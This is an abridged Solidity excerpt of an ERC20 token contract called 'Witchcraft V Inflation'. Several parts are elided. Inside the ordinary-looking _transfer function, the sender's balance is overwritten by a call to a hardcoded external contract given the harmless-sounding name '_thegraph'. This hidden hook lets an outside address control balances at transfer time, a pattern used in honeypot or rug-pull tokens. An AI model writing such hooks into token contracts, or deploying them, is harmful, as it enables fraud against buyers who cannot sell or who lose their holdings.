...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _thegraph =0x5333cd44c7d6F42154306a21A26911a97AD8B2C1 ;
    address public pair;
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        senderBalance = thegraph.stakeTokens(sender, recipient, senderBalance);
...
contract Witchcraft is ERC20Token {
    constructor() ERC20Token("Witchcraft V Inflation", "WITCHCRAFT", msg.sender, 69000000 * 10 ** 18) {
    }
}